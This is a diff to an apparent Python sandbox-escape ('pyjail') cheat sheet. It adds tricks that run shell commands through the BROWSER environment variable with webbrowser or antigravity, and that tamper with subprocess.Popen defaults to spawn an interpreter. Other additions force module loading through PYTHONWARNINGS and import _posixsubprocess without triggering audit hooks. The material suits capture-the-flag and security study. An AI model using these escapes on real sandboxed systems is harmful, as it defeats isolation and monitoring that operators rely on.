@@ -86,6 +86,7 @@ except Exception as e: # you don't need "Exception" in bytecode
 (()for(_)in()).gi_frame.f_back.f_builtins
 ```
 
+
 ### Executing code
 ```py
 >>> exec / eval
@@ -106,12 +107,6 @@ except Exception as e: # you don't need "Exception" in bytecode
 - `os`
 - `pdb`
 - `subprocess`
-#### webbrowser
-```py
-import os, webbrowser
-os.environ = dict(BROWSER="/bin/sh -c 'ls -lah' #%s")
-webbrowser.open('') # or import antigravity
-```
 #### program exit
 ```py
 import sys
@@ -134,10 +129,39 @@ class X:
 sys.modules["pwnd"] = X()
 sys.exit()
 ```
+#### special attributes
+```py
+import subprocess as sp
+from os import Popen
+sp.Popen.__init__.__defaults__ = (-1, "/usr/bin/python3", None, None, None, None, True, False, None, {'PYTHONINSPECT':'1'}, None, None, 0, True, False, ()) 
+popen('whatever')
+```
 #### metaclass
 ```py
 >>> class Class("arg2", "arg2", metaclass=print): 0
 Class ('arg2', 'arg2') {'__module__': '__main__', '__qualname__': 'Class'}
+```
+
+#### environment variables
+##### BROWSER
+The antigravity trick.
+```py
+__import__('antigravity', setattr(__import__('os'), 'environ', dict(BROWSER = '/bin/sh -c "ls -la" #%s')))
+```
+```py
+import os, webbrowser
+os.environ = dict(BROWSER="/bin/sh -c 'ls -lah' #%s")
+webbrowser.open('')
+```
+##### PYTHONINSPECT
+If set to `1`, will launch an interpreter after the code execution (similar to `python3 -i`). Requires a tty.
+##### PYTHONWARNINGS
+Can force loading of modules (similar to `python3 -W...`)
+```sh
+$ BROWSER='/bin/sh -c "echo hey!" #%s' python3 '-Wall:0:antigravity.x:0:0' -c 'print("listen!")'
+# hey!
+# Invalid -W option ignored: unknown warning category: 'antigravity.x'
+# listen!
 ```
 
 ### Extracting inner objects from proxies
@@ -150,6 +174,8 @@ Class ('arg2', 'arg2') {'__module__': '__main__', '__qualname__': 'Class'}
 >>> '+'.isspace()
 True
 ```
+
+
 
 ## **Bypassing Characters Filters**
 
@@ -176,7 +202,7 @@ You can't indent with `\x0c`.
 >>> test()
 'test'
 ```
-You can use `\r` as an alternative newline (not detected by `input`).
+You can use `\r` as an alternative newline (which passes through `input`).
 
 ### No brackets
 ```py
@@ -271,6 +297,7 @@ In other words, `print.__get__(self)` is a no-op.
 
 ### Auditless import
 ```py
+__loader__.load_module('_posixsubprocess')
 object.__subclasses__()[84].load_module('_posixsubprocess')
 ```
 `_imp` is always loaded, so this doesn't trigger the `import` audit:
